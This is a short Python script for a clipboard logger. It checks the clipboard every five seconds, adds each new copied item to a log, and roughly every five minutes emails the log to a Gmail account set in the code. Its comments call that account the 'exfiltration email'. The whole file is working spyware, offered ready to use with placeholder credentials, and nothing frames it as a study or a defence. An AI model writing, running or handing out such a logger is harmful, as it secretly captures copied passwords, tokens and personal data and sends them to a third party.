#! Python

# To grab the clipboard.
import pyperclip
# Used to send emails every certain amount of time of the log.
import smtplib
# Threading Library.
import threading

log = ""
lastLogged = ""
count = 0

# Sends us the email of the log on the given interval.
def send_email(email, password, message):
    # Initialize server for gmail
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    # Start server
    email_server.starttls()
    # Login for me
    email_server.login(email, password)
    # Send the log to yourself
    email_server.sendmail(email, email, message)
    # Quit
    email_server.quit()

# We need to THREAD to send emails and retrieve info at the same time.
def thread_function():
    global log
    global count
    global lastLogged
    if count < 60:
        if lastLogged != pyperclip.paste():
            log += pyperclip.paste()
            lastLogged = pyperclip.paste()
        count += 1
        timer_object = threading.Timer(5, thread_function)
        timer_object.start()
    else:
        if lastLogged != pyperclip.paste():
            log += pyperclip.paste()
            lastLogged = pyperclip.paste()
        # Change the first two values to whatever your desired exfiltration email is.
        send_email("emailaddress@gmail.com", "yourpassword", log)
        # Uncomment this line if you want a demo that prints to the command line instead of emailing yourself.
        #print(log)
        log = ""
        count = 0
        timer_object = threading.Timer(5, thread_function)
        timer_object.start()

thread_function()
